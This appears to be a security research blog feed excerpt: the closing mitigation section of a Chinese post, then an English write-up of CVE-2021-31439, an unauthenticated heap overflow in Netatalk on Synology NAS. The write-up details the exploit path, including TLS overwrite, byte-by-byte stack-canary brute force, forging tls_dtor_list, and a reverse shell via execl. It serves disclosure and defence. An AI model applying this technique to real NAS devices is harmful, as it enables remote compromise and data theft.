&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;目前上述三台皆已修補，請尚未更新的用戶更新到最新&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;該漏洞也在近期釋出的 &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt; 版本中修復，如有使用到 Netatalk 3.1.13 以前版本，也請務必更新。&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;沒使用 AFP 時，最好直接關掉或只限制在內網存取。該 project 幾乎已經很少維護，繼續使用風險極高。&lt;/li&gt;
  &lt;li&gt;改用 SMB &lt;strong&gt;相對安全&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;如果想要用類似功能，建議可使用 SMB 相對安全不少，但只能說相對安全，不能說絕對沒問題，建議還是將相關服務都開在內網就好，沒用到的能關就關&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;我們已成功在 NAS 中找到一個嚴重漏洞，並且成功寫出概念證明程式，證實可以利用在 Synology、QNAP 及 Asustor 等主流 NAS 上利用。我們也認為 Netatalk 是在 NAS 中新一代的後門!&lt;/p&gt;

&lt;p&gt;未來希望有使用到第三方套件的 NAS 廠商，可以多重新審視一下第三方套件所帶來的安全性問題，強烈建議可以自行 Review 一次，並且注意其他廠商是否也有修復同樣套件上的漏洞，很有可能自己也會受到影響，也希望使用 NAS 的用戶，也能多多重視不要把 NAS 開在外網，能關的服務就盡可能關閉，以減少攻擊面，讓攻擊者有機可趁。&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;事實上，我們並不只有找到一個漏洞，我們也發現還有不少問題，也運用在去年的 Pwn2Own Austin 上，這部分我們在大部分廠商修復後會在公開其他的研究，就敬請期待 Part II。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Two years ago, we found a &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;critical vulnerability&lt;/a&gt;, CVE-2021-31439, on Synology NAS. This vulnerability can let an unauthorized attacker gain code execution on remote Synology DiskStation NAS server. We used this vulnerability to exploit Synology DS418play NAS in Pwn2Own Tokyo 2020. After that, we found the vulnerability is not only exists on Synology but also on most NAS vendors. Following we will describe the details and how we exploit it.&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2021/en&quot;&gt;HITCON 2021&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;In the early days, NAS was generally used to separate the server and data and also used for backup. It was mainly used to allow users to directly access data and share files on the Internet. In modern times, NAS provides not only file sharing but also various services. In this era of Internet of Things, there will be more people combining NAS and home assistants to make life more convenient.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-nas&quot;&gt;Why do we want to research NAS?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While we were doing red team assessment, we found that NAS generally appeared in the corporate intranet, or sometimes even exposed to the external network. They usually stored a lot of corporate confidential information on the NAS. Therefore, NAS gradually attracted our attention, and its Strategic Value has been much higher than before.&lt;/p&gt;

&lt;h4 id=&quot;ransomware&quot;&gt;Ransomware&lt;/h4&gt;
&lt;p&gt;NAS has become more and more popular in recent years. More and more people store important data on NAS. It makes NAS a target of ransomware. At the beginning of last year, NAS vulnerabilities led to outbreak of locker event. We hope to reduce the recurrence of similar things, thereby increasing the priority of NAS research to improve NAS security.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;The last reason is that NAS has become one of the main targets of Pwn2Own Mobile since 2020. We also wanted to try to join Pwn2Pwn event, so we decided to make NAS as the primary goal of the research at that time. Because of Synology is the most popular device in Taiwan, we decided start from it.&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our test environment is Synology DS918+. It very similar as DS418 play(target of Pwn2Own Tokyo 2020). In order to better meet the environment that we usually encounter and the requirements in Pwn2Own, it will be in the state of all default settings.&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First of all, we can use netstat to find which port is open. We can see that in the default environment, many services are opened, such as smb/nginx/afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In UDP, it has minissdpd/findhost/snmpd, etc., most of protocols help to find devices.&lt;/p&gt;

&lt;p&gt;We selected a few services for preliminary analysis.&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;The first one is the DSM Web interface. This part is probably the one that most people analyze and it has obvious entry points. Many years ago, there were many command injection vulnerabilities, but after that Synology set strict specifications. There are almost no similar problems nowadays.&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;The SMB protocol in Synology is based on &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt;. Due to the large number of user, many researcher are doing code review on it. Therefore, there are many vulnerabilities found in Samba every year. The most famous vulnerability recently is &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;. But because more people are reviewing, it is relatively safer than other services.&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;It mainly helps users manage and monitor iSCSI services and it is developed by Synology itself. There are a lot of vulnerabilities in iSCSI recently. Maybe it will be a good target. If there is no other attack surface, we might analyze it first.&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;The last one is Netatalk, which is known as afp protocol. Netatalk in Synology is based on &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Netatak&lt;/a&gt; 3.1.8. The most critical vulnerability recently is CVE-2018-1160. For this vulnerability, please refer to &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt;. Compared with other services, Netatalk has very few vulnerabilities in the past. It is less noticed, and it has not been updated and maintained for a long time.&lt;/p&gt;

&lt;p&gt;After overall analysis, we believe that Netatalk is the most vulnerable point in Synology. We finally decided to analyze it first. In fact, there are other services and attack surfaces, but we didn’t spend much time on other service. We will only focus on Netatalk in this article.&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
&lt;p&gt;Apple Filing Protocol (AFP) is a file transfer protocol similar to SMB. It is used to transfer and share files on MAC. Because Apple itself is not open-sourced, in order to utilize AFP on Unix-like systems, Netatalk is created. Netatalk is a freely-available Open Source AFP fileserver. Almost every NAS uses it to make file sharing on MAC more convenient.&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;

&lt;p&gt;The netatalk in Synology is enabled by default. The version is modified from netatalk 3.1.8, and it tracks security updates regularly. Once installed, you can use the AFP protocol to share files with Synology NAS. It also enables protections such as ASLR, NX and StackGuard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;
&lt;p&gt;Before we look into the detail of the vulnerability we need to talk about Data Stream Interface (DSI). The DSI is a session layer format used to carry AFP traffic over TCP. While server and client communicate through the AFP, a DSI header is in front of each packet.&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The content of the DSI packet is shown as the figure above. It contains metadata and payload, which generally follows the DSI header and payload format.&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The communication of the AFP protocol is shown above. The client first gets the server information to determine available authentication methods, the version used, and so on. Then it opens a new session and to execute AFP commands. Without authentication, we can only do related operations such as login and logout. Once the client is verified, we can do file operations like SMB.&lt;/p&gt;

&lt;p&gt;In Netatalk implementation, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_block&lt;/code&gt; will be used as the packet structure.&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag means that the packet is a request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command indicates what our request does
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Netatalk, most of the information are stored in a structure called DSI for subsequent operations after parsing the packet and configuration files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt; and payload content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The payload of the packet is stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command&lt;/code&gt; buffer in the DSI structure. The buffer size is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt;, and the value is specified in the afp configuration file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;afp.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If not specified, it uses the default size(0x100000).&lt;/p&gt;

&lt;p&gt;With a preliminary understanding, let’s talk about this vulnerability.&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability we found occurs while receiving the payload. It can be triggered without authentication. The vulnerable function is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s the function that parses the information from received packet and puts it into the DSI structure. When it receives the packet data, it first determine how much data to read into the command buffer according to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; in the dsi header. At the beginning, the size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; is verified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, as shown in the picture above, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is provided by user, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is used as the length. There is no verification here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The default length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is 0x100000(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;), which is a fixed length allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt;, so as long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;header.dsi_doff&lt;/code&gt; is larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;, heap overflow occurs.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;In DSM 6.2.3, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; buffer is allocated by malloc at libc 2.20. When it allocates more than 0x20000, malloc calls mmap to allocate memory. The memory layout of afpd after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt; is as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the below of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is Thread Local Storage, which is used to store thread local variables of the main thread.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because of this memory layout, we can use the vulnerability to overwrite the data on Thread Local Storage. What variables to be overwritten in the Thread Local Storage?&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage (TLS) is used to store the local variables of the thread. Each thread have its own TLS, which allocated when the Thread is created. It will be released when thread is destroyed. We can use heap overflow vulnerabilities to overwrite most of the variables stored in TLS.&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;In fact, there are many variables that can control RIP on TLS. Here are a few more common ones.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can forge main_arena to achieve arbitrary writing, but it’s more complicated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can modify the pointer guard to change the function pointer, but it requires a leak.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;It’s more suitable for our current situation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;We can use the &lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;technique&lt;/a&gt; used by project zero in 2014 to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, and then control the RIP in exit().&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; is a singly linked list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; objects. It is mainly a destructor for thread local storage. In the end of the thread execution, it calls destructor function pointer in the linked list. We can overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; we forged.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the process exits, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt;. This function takes the object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; and calls each destructor. At this time, if we can control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, it calls the function we specified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, in the new version of glibc, the function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; is protected by pointer guard. So we need to know the value of pointer guard before we overwrite it. The pointer guard is initialized at the beginning of the program and is an unpredictable random number. If we don’t have information leakage, it’s hard to know the value.&lt;/p&gt;

&lt;p&gt;But in fact pointer guard would also be placed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure below the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, which is the thread descriptor of main thread.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure is used to store various information about the thread such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt; used by the thread. In x86-64 Linux system, the fs register always points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; of the current thread, so the program access thread local storage by using fs register. The memory layout of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread local storage&lt;/code&gt; is shown as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use the vulnerability to overwrite not only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; but also pointer guard in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt;. In this way, we can overwrite it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; to solve the pointer guard problem mentioned earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But another problem appears, after we overwrite pointer guard, stack guard will also be overwritten.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before netatalk receives data, it first puts the original stack guard on the stack, and then invoke recv() to receive data to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;command&lt;/code&gt;. At this time, the buffer overflow occurs and cause stack guard and pointer guard to be overwritten. After this, netatalk returns to normal execution flow. It takes the stack guard from the stack and compare it with the stack guard in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;. However, it has been overwritten by us, the comparison here fails, causing abort to terminate the program.&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the netatalk(afpd) architecture, each connection forks a new process to handle the user’s request, so the memory address and stack guard of each connection are the same as the parent process. Because of this behavior, we can use brute-force bytes one by one to leak stack guard.&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

&lt;p&gt;We can use the overflow vulnerability to overwrite only the last byte of stack guard on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt; with different value in each different connection. Once the value is different from the original value, the service disconnects. Therefore, we can use the behavior to validate whether the value we overwritten is the same as stack guard. After the lowest byte is determined, we can continue to add another byte, and so on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above figure, we assume that the stack guard is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;. Due to the stack guard feature in Linux, the lowest byte must be 0. Let’s start with the second byte. We can overwrite with 0x00 to see if the connection is disconnected first. If it is disconnected, it means the value we overwrote is wrong. Next, we will test other values to see if the connection is disconnected. And so on, until there is no disconnection, we can find the correct value of section bytes. Then we can try to overwrite third byte, fourth byte and so on. After the stack guard is overwritten with 8 bytes and the connection is not disconnected, we can successfully bypass the stack guard.&lt;/p&gt;

&lt;p&gt;After we leak the stack guard, we can actually control RIP successfully. 
Next, we need to forge the structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP.&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

&lt;p&gt;In DSM 6.2.3-25426, Because it does not enable PIE, we can forge &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the data section of afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luckily, when netatalk use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhx2 login&lt;/code&gt; authentication, it will copy the username we provided to the data section of afpd. We can use the feature to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the known address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After everything is constructed, we can trigger the normal function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; to control the RIP.&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in the glibc-2.20 in DSM 6.2.3-25426, it will invoke  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr&lt;/code&gt; to get the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;. The function will take the variable from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt;. We also need to construct it on a known address.&lt;/p&gt;

&lt;p&gt;The final structure we forged is as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we control RIP to invoke execl() in afpd to get the reverse shell.&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;
